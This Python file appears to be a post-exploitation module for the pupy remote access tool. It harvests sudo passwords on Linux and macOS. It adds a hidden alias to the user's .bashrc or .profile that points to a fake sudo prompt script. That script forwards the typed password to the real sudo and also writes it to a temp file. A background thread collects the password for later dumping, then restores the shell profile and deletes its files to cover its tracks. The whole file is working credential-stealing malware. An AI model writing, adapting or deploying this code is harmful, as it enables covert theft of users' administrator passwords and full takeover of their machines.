import subprocess
import threading
import tempfile
import getpass
import string
import random
import time
import stat
import sys
import os

############## Stat / Stop / Dump functions ##############

def sudo_alias_start():
    if hasattr(sys, 'SUDO_ALIAS_THREAD'):
        return False

    sudo = SudoAlias()
    sudo.start()
    sys.SUDO_ALIAS_THREAD = sudo
    return True

def sudo_alias_dump():
    if hasattr(sys, 'SUDO_ALIAS_THREAD'):
        return sys.SUDO_ALIAS_THREAD.dump()

def sudo_alias_stop():
    if hasattr(sys, 'SUDO_ALIAS_THREAD'):
        sys.SUDO_ALIAS_THREAD.stop()
        del sys.SUDO_ALIAS_THREAD
        return True
    return False

############## Main class ##############

class SudoAlias(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self, *args, **kwargs)
        self.daemon  = True
        self.stopped = False

        if not hasattr(sys, 'SUDO_ALIAS_BUFFER'):
            sys.SUDO_ALIAS_BUFFER = ''

        home = os.path.expanduser("~")
        # profile file is loaded on Mac os instead of bashrc
        self.system = sys.platform
        if self.system == 'darwin':
            self.bashrc = os.path.join(home, '.profile')
        else:
            self.bashrc = os.path.join(home, '.bashrc')

        # alias path
        random_alias_name       = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
        self.alias_file         = os.path.join(tempfile.gettempdir(), random_alias_name)

        # password stored on a tmp path
        random_password_name    = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
        self.password_file      = os.path.join(tempfile.gettempdir(), random_password_name)

        self.original_bashrc_content = ''

    def stop(self):
        self.stopped = True
        self.clean_files()

    def dump(self):
        res=sys.SUDO_ALIAS_BUFFER
        sys.SUDO_ALIAS_BUFFER = ''
        return res

    def store_sudo_password(self, password):
        sys.SUDO_ALIAS_BUFFER += '{username}/{password}'.format(username=getpass.getuser(), password=password)

    def clean_files(self):
        # remove tmp files
        if os.path.exists(self.password_file):
            os.remove(self.password_file)

        if os.path.exists(self.alias_file):
            os.remove(self.alias_file)

        # restore file
        open(self.bashrc, 'w').write(self.original_bashrc_content)

    def sudo_alias_code(self):
        return '''
#!/bin/bash
username=`whoami`
maxtries=3
cmd=""
if [ $# -gt 0 ]
then
    cmd="$@"
else
    cmd=`$realSudo`
fi
password=""
cpt=0
correct=1
while [ $cpt -ne $maxtries ]
do
    read -s -p "[sudo] password for $username: " password
    sudo -K 2>/dev/null
    output=`echo "$password" | sudo -S $cmd 2>/dev/null`
    if [ $? -ne 0 ]
    then
        echo ""
        echo "Sorry, try again."
        cpt=`expr $cpt + 1`
    else
        echo ""
        echo "$output"
        correct=0
        break
    fi
done
if [ $correct -eq 1 ]
then
    echo "sudo: $cpt incorrect password attempts"
    exit 1
else
    # [OPTIONAL_LINE]
    echo "$password" > [STORE_PASSWORD]
    exit 0
fi
'''

    def run(self):
        if os.path.exists(self.bashrc):
            self.original_bashrc_content = open(self.bashrc).read()

        # TO DO
        # launch pupy as root
        # replace # [OPTIONAL_LINE] by echo "$password" | sudo -S <path_to_pupy_binary>

        # write code to the tmp directory
        code = self.sudo_alias_code().replace('[STORE_PASSWORD]', self.password_file)
        open(self.alias_file, 'w').write(code)

        # change file permission to be executable
        if self.system == 'darwin':
            # os.chmod does not work on mac os
            cmd = 'chmod +x {alias_file}'.format(alias_file=self.alias_file)
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
        else:
            st = os.stat(self.alias_file)
            os.chmod(self.alias_file, st.st_mode | stat.S_IEXEC)

        # create alias sudo
        alias = "\nalias sudo='{alias_file}'\n".format(alias_file=self.alias_file)
        open(self.bashrc, 'a+').write(alias)

        # wait to get the password
        password = ''
        while not self.stopped:
            if os.path.exists(self.password_file):
                password = open(self.password_file).read()
                self.store_sudo_password(password)
                self.stopped = True
            time.sleep(5)

        # clean everything
        self.clean_files()
